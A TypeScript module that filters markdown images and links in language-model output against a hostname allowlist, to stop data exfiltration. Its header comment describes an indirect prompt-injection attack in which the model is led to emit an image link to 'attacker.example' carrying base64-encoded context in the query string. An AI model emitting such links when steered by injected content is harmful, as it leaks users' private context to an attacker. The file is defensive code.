/**
 * Output-side filter: markdown link/image URL allowlisting to prevent
 * model-output-mediated exfiltration.
 *
 * The dominant real-world LLM exploitation pattern is:
 *
 *   1. Adversarial content reaches the model context (indirect injection).
 *   2. Model is induced to emit `![](https://attacker.example/?leak=...)`
 *      with sensitive context base64'd into the URL.
 *   3. Client renders markdown → browser fetches the image → attacker logs
 *      the exfiltrated context.
 *
 * Defense: at render time, parse markdown for `![](...)` and `[...](...)`
 * patterns, check each URL against an explicit allowlist, replace blocked
 * URLs with a visible "blocked" marker that does NOT trigger a network fetch.
 *
 * Default allowlist is empty (security-first). The host application
 * (`leet`, `codec-website`, recruiter UI, etc.) configures its allowlist
 * explicitly. Strip query strings even from allowlisted domains: exfil
 * rides in the query string.
 *
 * Maps to spec/proposals/v0.6-security/04-output-exfiltration.md.
 */

export interface OutputFilterOptions {
  /** Allowed hostnames for `![](...)` image refs. Empty default = block all. */
  allowedImageHostnames?: readonly string[];
  /** Allowed hostnames for `[...](...)` link refs. Empty default = block all. */
  allowedLinkHostnames?: readonly string[];
  /** Strip query strings on allowed URLs as defense-in-depth. Default true. */
  stripQueryStrings?: boolean;
}

export interface FilteredOutput {
  /** The filtered markdown, safe to render. */
  text: string;
  /** Per-URL filter decisions, for telemetry / surfacing to the user. */
  blocked: Array<{
    kind: 'image' | 'link';
    url: string;
    reason: 'non-allowlisted-domain' | 'invalid-url' | 'data-uri' | 'javascript-uri';
  }>;
  allowed: Array<{
    kind: 'image' | 'link';
    url: string;
  }>;
}

const IMG_RE = /!\[([^\]]*)\]\(([^)]+)\)/g;
const LINK_RE = /(?<!!)\[([^\]]*)\]\(([^)]+)\)/g;

function classify(
  url: string,
  allowlist: readonly string[] | undefined,
): { ok: boolean; reason?: FilteredOutput['blocked'][number]['reason'] } {
  if (url.startsWith('data:')) return { ok: false, reason: 'data-uri' };
  if (/^javascript:/i.test(url)) return { ok: false, reason: 'javascript-uri' };
  if (url.startsWith('#') || url.startsWith('/')) return { ok: true }; // local/anchor
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return { ok: false, reason: 'invalid-url' };
  }
  const host = parsed.hostname.toLowerCase();
  if (!allowlist || allowlist.length === 0) {
    return { ok: false, reason: 'non-allowlisted-domain' };
  }
  for (const allowed of allowlist) {
    if (host === allowed.toLowerCase()) return { ok: true };
    if (host.endsWith('.' + allowed.toLowerCase())) return { ok: true };
  }
  return { ok: false, reason: 'non-allowlisted-domain' };
}

function stripQs(url: string): string {
  try {
    const u = new URL(url);
    return u.origin + u.pathname;
  } catch {
    return url;
  }
}

/**
 * Filter rendered-markdown URLs against an allowlist.
 *
 * Replaces blocked image refs with `[image blocked: <reason>]` and blocked
 * link refs with a `#link-blocked-<reason>` anchor. Both renders are visible
 * to the user (so the redaction is auditable) but neither triggers a
 * network fetch.
 */
export function filterMarkdownOutput(
  markdown: string,
  options: OutputFilterOptions = {},
): FilteredOutput {
  const opts = {
    allowedImageHostnames: options.allowedImageHostnames ?? [],
    allowedLinkHostnames: options.allowedLinkHostnames ?? [],
    stripQueryStrings: options.stripQueryStrings ?? true,
  };

  const blocked: FilteredOutput['blocked'] = [];
  const allowed: FilteredOutput['allowed'] = [];

  let text = markdown.replace(IMG_RE, (_match, alt: string, url: string) => {
    const verdict = classify(url, opts.allowedImageHostnames);
    if (!verdict.ok) {
      blocked.push({ kind: 'image', url, reason: verdict.reason! });
      return `[image blocked: ${verdict.reason}]`;
    }
    allowed.push({ kind: 'image', url });
    return `![${alt}](${opts.stripQueryStrings ? stripQs(url) : url})`;
  });

  text = text.replace(LINK_RE, (_match, label: string, url: string) => {
    const verdict = classify(url, opts.allowedLinkHostnames);
    if (!verdict.ok) {
      blocked.push({ kind: 'link', url, reason: verdict.reason! });
      return `[${label}](#link-blocked-${verdict.reason})`;
    }
    allowed.push({ kind: 'link', url });
    return `[${label}](${opts.stripQueryStrings ? stripQs(url) : url})`;
  });

  return { text, blocked, allowed };
}
